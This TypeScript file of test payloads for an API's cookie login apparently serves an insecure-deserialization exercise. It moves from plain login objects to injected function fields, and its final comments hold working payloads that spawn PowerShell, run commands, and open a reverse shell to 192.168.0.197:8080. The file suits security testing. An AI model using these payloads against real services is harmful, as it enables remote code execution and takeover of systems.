/**
 * EXAMPLE PAYLOADS:
 * to test the API, stringify one of the payloads below, convert to Base64 and add it to the request header (cookie).
 */

// simple login with user 'Mallory'
// eyJpZCI6IjEzMzciLCJwYXNzd29yZCI6ImhlbGxvIn0=
export const test1 = {
    'id': '1337',
    'password': 'hello'
}

// simple login with user 'Mallory' but wrong password
// eyJpZCI6IjEzMzciLCJwYXNzd29yZCI6Indyb25ncGFzc3dvcmQifQo=
export const test2 = {
    'id': '1337',
    'password': 'wrongpassword'
}

// Mallory's login attempt, but with some extra attribute:
// eyJpZCI6IjEzMzciLCJwYXNzd29yZCI6ImhlbGxvIiwidGVzdCI6ZnVuY3Rpb24gKCkgewogICAgICAgIGNvbnNvbGUubG9nKCJldmlsIHBheWxvYWQiKTsKICAgIH19
// @ts-ignore
export const test3 = {
    id: '1337',
    password: function payload() {
        console.log("test")
    },
}

// eyJpZCI6IjEzMzciLCJwYXNzd29yZCI6ImhlbGxvIiwidGVzdCI6ZnVuY3Rpb24gKCkgewogICAgICAgIHJldHVybiBjb25zb2xlLmxvZygiZXZpbCBwYXlsb2FkIik7CiAgICB9LCJ0ZXN0MiI6dGVzdCgpfQo=
// @ts-ignore
export const test4 = {
    id: '1337',
    payload_1: console.log(1),
    payload_2: console.log(2),
    payload_3: console.log(3),
    payload_4: console.log(4),
}

// spawn Powershell:
// "{\"p1\": foo=function(){child_process.spawn('powershell.exe').stdout.on(\"data\",function(data){console.log(\"Powershell Data: \" + data);\n})},\"p2\":foo()}"

// execute Powershell command:
// "{\"p1\": foo=function(){child_process.exec('dir', {'shell':'powershell.exe'}, (error, stdout, stderr)=> {console.log(stdout)\n})},\"p2\":foo()}"

// reverse shell example:
//"{\"p1\": foo=function(){let sh = child_process.spawn('powershell.exe');\nlet client = new net.Socket(); client.connect(8080, \"192.168.0.197\", function(){client.pipe(sh.stdin);sh.stdout.pipe(net.client);sh.stderr.pipe(net.client); return /a/})},\"p2\":foo()}"
